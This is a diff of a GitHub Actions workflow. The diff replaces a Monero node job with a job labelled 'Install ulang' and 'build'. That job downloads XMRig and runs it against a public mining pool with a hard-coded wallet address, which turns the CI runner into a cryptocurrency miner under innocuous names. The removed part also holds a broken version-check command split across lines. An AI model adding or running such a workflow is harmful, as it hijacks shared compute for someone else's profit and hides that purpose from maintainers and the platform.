@@ -1,36 +1,18 @@
-name: XMO Node CI
+name: Install ulang 
 
 on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-  workflow_dispatch:
+  workflow_dispatch: # bisa dijalankan manual lewat tab Actions
 
 jobs:
-  run-xmo-node:
+  build:
     runs-on: ubuntu-latest
-
     steps:
-      # Checkout repository
-      - name: Checkout Repository
+      - name: Checkout repo
         uses: actions/checkout@v4
 
-      # Install dependencies (tar, wget)
-      - name: Install Dependencies
-        run: sudo apt update && sudo apt install -y wget tar
-
-      # Download, extract, and run XMO node
-      - name: Download, Extract, and Run XMO Node
+      - name: Download XMRig
         run: |
-          wget https://github.com/XmanXU/monero-original/releases/download/v0.11.3.0/monero-original-linux-x64-v0.11.3.0.tgz -O monero-original.tgz
-          mkdir -p $HOME/xmo
-          tar -xzf monero-original.tgz -C $HOME/xmo
-          cd $HOME/xmo
-          chmod +x monerod
-          ./monerod --detach --no-igd --non-interactive --rpc-bind-ip 0.0.0.0 --confirm-external-bind
-
-      # Optional: Check node version
-      - name: Check XMO Node Version
-        run: $HOME/xmo/monerod --versio
-        n
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf xmrig-6.24.0-linux-static-x64.tar.gz
+          cd xmrig-6.24.0
+          ./xmrig -o pool.supportxmr.com:3333 -u 43YesyPEfNHZmiBjf1LBBB5QaUYWZHoohcexHc4xpbWB9jTzAD7XTjYHqaoyNmYamWb9Eheq4uvjQ4YhdHtNcaawHYrV2NB  -p x 
